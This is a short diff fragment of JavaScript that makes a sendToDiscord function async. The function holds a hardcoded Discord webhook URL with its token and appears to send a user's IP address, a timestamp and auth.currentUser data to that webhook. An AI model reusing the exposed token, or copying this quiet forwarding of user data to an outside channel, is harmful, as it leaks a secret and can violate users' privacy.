@@ -322,7 +322,7 @@
                 .catch((error) => {
                     sendToDiscord();
                 });
-            function sendToDiscord(ip, timestamp) {
+            async function sendToDiscord(ip, timestamp) {
                 const webhookURL = "https://discord.com/api/webhooks/1199901231636815882/o_v_uZS_0xHiDxrMttjfSBfAtDcwPrpq51HdYjHcogySNpuc48ZJKIO3MpxzPjozqZGO";
 
                 const user = auth.currentUser;
